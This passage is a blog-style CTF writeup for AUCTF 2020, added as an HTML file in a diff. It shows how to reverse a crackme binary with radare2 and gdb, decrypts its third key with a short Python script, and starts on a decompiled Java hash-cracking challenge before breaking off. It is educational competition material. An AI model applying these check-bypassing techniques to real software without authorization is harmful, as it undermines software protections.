@@ -1,0 +1,689 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="AUCTF 2020" /><meta name="author" content="Abdelrahman Nasr" /><meta property="og:locale" content="en_US" /><meta name="description" content="A place where you can find Reversing Engineering CTF challenges writeups, Malware Analysis reports and some low-level geeky stuff" /><meta property="og:description" content="A place where you can find Reversing Engineering CTF challenges writeups, Malware Analysis reports and some low-level geeky stuff" /><link rel="canonical" href="https://t1m3m.github.io/posts/auctf-2020/" /><meta property="og:url" content="https://t1m3m.github.io/posts/auctf-2020/" /><meta property="og:site_name" content="T1m3-m4ch1n3" /><meta property="og:image" content="https://t1m3m.github.io/assets/img/posts/2020-12-18-auctf-2020/cover.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-18T22:38:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://t1m3m.github.io/assets/img/posts/2020-12-18-auctf-2020/cover.png" /><meta property="twitter:title" content="AUCTF 2020" /><meta name="twitter:site" content="@T1m3M" /><meta name="twitter:creator" content="@Abdelrahman Nasr" /><meta name="google-site-verification" content="wjab7JjezNdGg3dhJv8-6KbCIlqjjYnFBlntUWCuq3g" /> <script type="application/ld+json"> {"description":"A place where you can find Reversing Engineering CTF challenges writeups, Malware Analysis reports and some low-level geeky stuff","headline":"AUCTF 2020","dateModified":"2020-12-18T22:38:00+02:00","datePublished":"2020-12-18T22:38:00+02:00","@type":"BlogPosting","image":"https://t1m3m.github.io/assets/img/posts/2020-12-18-auctf-2020/cover.png","url":"https://t1m3m.github.io/posts/auctf-2020/","mainEntityOfPage":{"@type":"WebPage","@id":"https://t1m3m.github.io/posts/auctf-2020/"},"author":{"@type":"Person","name":"Abdelrahman Nasr"},"@context":"https://schema.org"}</script><title>AUCTF 2020 | T1m3-m4ch1n3</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">T1m3-m4ch1n3</a></div><div class="site-subtitle font-italic"></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/T1m3M" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/T1m3M" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['1.h4ck.t1m3','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/abdelrahman-nasr99/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>AUCTF 2020</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>AUCTF 2020</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Dec 18, 2020, 10:38 PM +0200" > Dec 18, 2020 <i class="unloaded">2020-12-18T22:38:00+02:00</i> </span> by <span class="author"> Abdelrahman Nasr </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Dec 18, 2020, 11:47 PM +0200" > Dec 18, 2020 <i class="unloaded">2020-12-18T23:47:28+02:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/cover.png" class="post-preview-img"><p>AUCTF 2020 has ended, and me and my team <strong>P1rates</strong> really enjoyed it as it was full of good problems, here’s my writeup about some of the problems that i solved.</p><h2 id="challenges">Challenges</h2><div class="table-wrapper"><table><thead><tr><th>Title<th style="text-align: center">Category<tbody><tr><td><a href="#cracker-barrel">Cracker Barrel</a><td style="text-align: center">Reversing<tr><td><a href="#mr-game-and-watch">Mr. Game and Watch</a><td style="text-align: center">Reversing<tr><td><a href="#sora">Sora</a><td style="text-align: center">Reversing<tr><td><a href="#dont-break-me">Don’t Break Me</a><td style="text-align: center">Reversing<tr><td><a href="#thanksgiving-dinner">Thanksgiving Dinner</a><td style="text-align: center">Pwn</table></div><hr /><h2 id="cracker-barrel">Cracker Barrel</h2><h4 id="reversing">Reversing</h4><h3 id="description">Description</h3><blockquote><p><strong>I found a USB drive under the checkers board at cracker barrel. My friends told me not to plug it in but surely nothing bad is on it?<br /> I found this file, but I can’t seem to unlock it’s secrets. Can you help me out?<br /><br /> Also.. once you think you’ve got it I think you should try to connect to challenges.auctf.com at port 30000 not sure what that means, but it written on the flash drive..</strong></p></blockquote><h3 id="solution">Solution</h3><p>Firstly we start by <code class="language-plaintext highlighter-rouge">strings</code> command and obviously the flag isn’t there so we do <code class="language-plaintext highlighter-rouge">file</code> command we will find it’s ELF 64-bit, dynamically linked and not stripped.<br /></p><p>let’s do some radare2 stuff</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>r2 <span class="nt">-AA</span> cracker_barrel
+<span class="gp">[0x00001180]&gt;</span><span class="w"> </span>afl
+</pre></table></code></div></div><p>well, here we find some interesting function names like:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="go">main
+sym.check
+sym.check_1
+sym.check_2
+sym.check_3
+sym.print_flag
+</span></pre></table></code></div></div><p>then seeking to the main and entering the visual mode:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">[0x00001180]&gt;</span><span class="w"> </span>s main
+<span class="gp">[0x000012b5]&gt;</span><span class="w"> </span>VV
+</pre></table></code></div></div><p>we notice that main calls sym.check and then <code class="language-plaintext highlighter-rouge">test eax, eax</code> and the <code class="language-plaintext highlighter-rouge">je</code> if it’s false then it calls sym.print_flag .. So whatever happens inside check() function it MUST return a non-zero value so we can get the flag!</p><p>By digging into check() function we see clearly the it takes the user input and calls check_1() function and if the return is zero it returns zero (which we don’t need to happend), Otherwise it continues to call the second check which is check_2() and so on with check_3() .. so we need to make sure to return a non-zero value from these functions too</p><p>Now going deeper inside check_1():</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/cracker-barrel/cracker1.png" alt="r2 screenshot" /></div><p>as we see clearly it takes the user input in s1 variable, then “starwars” in s2 and compares them if they’re equal then it goes to the second check which compares the user input with “startrek” if they’re NOT equal it returns 1</p><p>So all we need to do is passing “starwars” as first input and by that we passed the first check!</p><p>Now we go to check_2() function in visual mode we’ll find there’s a string “si siht egassem terces” that get modified by some operations and then compared to our second input</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/cracker-barrel/cracker2.png" alt="r2 screenshot" /></div><p>as seen in the photo above we can make a breakpoint in the <code class="language-plaintext highlighter-rouge">cmp</code> instruction and examine the 2 strings I’ll use gdb for the debugging:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gdb cracker_barrel
+<span class="go">(gdb) set disassembly-flavor intel
+(gdb) disass check_2
+</span><span class="c">   ..
+</span><span class="gp">   0x0000000000001553 &lt;+132&gt;</span>:	mov    rsi,rdx
+<span class="gp">   0x0000000000001556 &lt;+135&gt;</span>:	mov    rdi,rax
+<span class="gp">   0x0000000000001559 &lt;+138&gt;</span>:	call   0x1130
+<span class="c">   ..
+</span><span class="go">
+(gdb) b *check_2+138
+Breakpoint 1 at 0x1559
+
+(gdb) r
+Give me a key!
+starwars
+You have passed the first test! Now I need another key!
+AAAA
+
+Breakpoint 1, 0x0000555555555559 in check_2 ()
+</span></pre></table></code></div></div><p>Now we hit the breakpoint on the comparing point now by examining rsi and rdi:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>(gdb) x/wx $rsi
+0x7fffffffc540:	0x41414141
+(gdb) x/2wx $rdi
+0x555555559420:	0x73692073	0x00000000
+</pre></table></code></div></div><p>Clearly rsi is our input and rdi is how our input must be! which represents “s is” as a string (in little endian)! And this our second input!</p><p>Now heading to our final check which is check_3 function() in visual mode .. we se a string “z!!b6~wn&amp;`” passed seperately to variables then it iterates through each character in the user input string and encrypt it as follows:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/cracker-barrel/cracker3.png" alt="r2 screenshot" /></div><p>The encryption method:</p><ul><li>take each character and add 0x2 to its hexadecimal value<li>XOR the result with 0x14</ul><p>And then compare the n-th character in the resulting string with the n-th character in “z!!b6~wn&amp;`” string. Our goal now is clear which is to decrypt “z!!b6~wn&amp;`” string:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="n">secret</span> <span class="o">=</span> <span class="s">"z!!b6~wn&amp;`"</span>
+<span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">secret</span><span class="p">:</span>
+    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</pre></table></code></div></div><p>Now by running it:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 decrypt.py
+<span class="go">l33t hax0r
+</span></pre></table></code></div></div><p>And that’s our third input! Now by connecting to the server to get the flag:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc challenges.auctf.com 30000
+<span class="go">Give me a key!
+starwars
+You have passed the first test! Now I need another key!
+s is
+Nice work! You've passes the second test, we aren't done yet!
+l33t hax0r
+Congrats you finished! Here is your flag!
+auctf{w3lc0m3_to_R3_1021}
+</span></pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">auctf{w3lc0m3_to_R3_1021}</code></p><hr /><h2 id="mr-game-and-watch">Mr. Game and Watch</h2><h4 id="reversing-1">Reversing</h4><h3 id="description-1">Description</h3><blockquote><p><strong>My friend is learning some wacky new interpreted language and different hashing algorithms. He’s hidden a flag inside this program but I cant find it…<br /><br /> He told me to connect to challenges.auctf.com 30001 once I figured it out though.</strong></p></blockquote><h3 id="solution-1">Solution</h3><p>First, we need to decompile the .class file to get its java source .. i used <a href="https://www.benf.org/other/cfr/">CFR java decompiler</a>:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>java <span class="nt">-jar</span> ~/cfr-0.149.jar mr_game_and_watch.class <span class="o">&gt;</span> mr_game_and_watch.java
+</pre></table></code></div></div><p>and this was the resulting source code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileReader</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.MessageDigest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">mr_game_and_watch</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="n">secret_1</span> <span class="o">=</span> <span class="s">"d5c67e2fc5f5f155dff8da4bdc914f41"</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="n">secret_2</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[]{</span><span class="mi">114</span><span class="o">,</span> <span class="mi">118</span><span class="o">,</span> <span class="mi">116</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">37</span><span class="o">,</span> <span class="mi">38</span><span class="o">,</span> <span class="mi">38</span><span class="o">,</span> <span class="mi">120</span><span class="o">,</span> <span class="mi">121</span><span class="o">,</span> <span class="mi">33</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">37</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">118</span><span class="o">,</span> <span class="mi">118</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">33</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">121</span><span class="o">,</span> <span class="mi">37</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">34</span><span class="o">,</span> <span class="mi">118</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">120</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">120</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">120</span><span class="o">,</span> <span class="mi">38</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">35</span><span class="o">,</span> <span class="mi">118</span><span class="o">};</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="n">secret_3</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[]{</span><span class="mi">268</span><span class="o">,</span> <span class="mi">348</span><span class="o">,</span> <span class="mi">347</span><span class="o">,</span> <span class="mi">347</span><span class="o">,</span> <span class="mi">269</span><span class="o">,</span> <span class="mi">256</span><span class="o">,</span> <span class="mi">348</span><span class="o">,</span> <span class="mi">269</span><span class="o">,</span> <span class="mi">256</span><span class="o">,</span> <span class="mi">256</span><span class="o">,</span> <span class="mi">344</span><span class="o">,</span> <span class="mi">271</span><span class="o">,</span> <span class="mi">271</span><span class="o">,</span> <span class="mi">264</span><span class="o">,</span> <span class="mi">266</span><span class="o">,</span> <span class="mi">348</span><span class="o">,</span> <span class="mi">257</span><span class="o">,</span> <span class="mi">266</span><span class="o">,</span> <span class="mi">267</span><span class="o">,</span> <span class="mi">348</span><span class="o">,</span> <span class="mi">269</span><span class="o">,</span> <span class="mi">266</span><span class="o">,</span> <span class="mi">266</span><span class="o">,</span> <span class="mi">344</span><span class="o">,</span> <span class="mi">267</span><span class="o">,</span> <span class="mi">270</span><span class="o">,</span> <span class="mi">267</span><span class="o">,</span> <span class="mi">267</span><span class="o">,</span> <span class="mi">348</span><span class="o">,</span> <span class="mi">349</span><span class="o">,</span> <span class="mi">349</span><span class="o">,</span> <span class="mi">265</span><span class="o">,</span> <span class="mi">349</span><span class="o">,</span> <span class="mi">267</span><span class="o">,</span> <span class="mi">256</span><span class="o">,</span> <span class="mi">269</span><span class="o">,</span> <span class="mi">270</span><span class="o">,</span> <span class="mi">349</span><span class="o">,</span> <span class="mi">268</span><span class="o">,</span> <span class="mi">271</span><span class="o">,</span> <span class="mi">351</span><span class="o">,</span> <span class="mi">349</span><span class="o">,</span> <span class="mi">347</span><span class="o">,</span> <span class="mi">269</span><span class="o">,</span> <span class="mi">349</span><span class="o">,</span> <span class="mi">271</span><span class="o">,</span> <span class="mi">257</span><span class="o">,</span> <span class="mi">269</span><span class="o">,</span> <span class="mi">344</span><span class="o">,</span> <span class="mi">351</span><span class="o">,</span> <span class="mi">265</span><span class="o">,</span> <span class="mi">351</span><span class="o">,</span> <span class="mi">265</span><span class="o">,</span> <span class="mi">271</span><span class="o">,</span> <span class="mi">346</span><span class="o">,</span> <span class="mi">271</span><span class="o">,</span> <span class="mi">266</span><span class="o">,</span> <span class="mi">264</span><span class="o">,</span> <span class="mi">351</span><span class="o">,</span> <span class="mi">349</span><span class="o">,</span> <span class="mi">351</span><span class="o">,</span> <span class="mi">271</span><span class="o">,</span> <span class="mi">266</span><span class="o">,</span> <span class="mi">266</span><span class="o">};</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="n">key_2</span> <span class="o">=</span> <span class="mi">64</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="n">key_3</span> <span class="o">=</span> <span class="mi">313</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">arrstring</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Welcome to the Land of Interpreted Languages!"</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"If you are used to doing compiled languages this might be a shock... but if you hate assembly this is the place to be!"</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"\nUnfortunately, if you hate Java, this may suck..."</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Good luck!\n"</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">crackme</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">print_flag</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">crackme</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nc">Scanner</span> <span class="n">scanner</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">in</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">crack_1</span><span class="o">((</span><span class="nc">Scanner</span><span class="o">)</span><span class="n">scanner</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">crack_2</span><span class="o">((</span><span class="nc">Scanner</span><span class="o">)</span><span class="n">scanner</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">crack_3</span><span class="o">((</span><span class="nc">Scanner</span><span class="o">)</span><span class="n">scanner</span><span class="o">))</span> <span class="o">{</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"That's correct!"</span><span class="o">);</span>
+            <span class="n">scanner</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Nope that's not right!"</span><span class="o">);</span>
+        <span class="n">scanner</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">crack_1</span><span class="o">(</span><span class="nc">Scanner</span> <span class="n">scanner</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Let's try some hash cracking!! I'll go easy on you the first time. The first hash we are checking is this"</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"\t"</span> <span class="o">+</span> <span class="n">secret_1</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"Think you can crack it? If so give me the value that hashes to that!\n\t"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
+        <span class="nc">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">hash</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string</span><span class="o">,</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="s">"MD5"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">string2</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="n">secret_1</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">crack_2</span><span class="o">(</span><span class="nc">Scanner</span> <span class="n">scanner</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Nice work! One down, two to go ..."</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"This next one you don't get to see, if you aren't already digging into the class file you may wanna try that out!\n\t"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
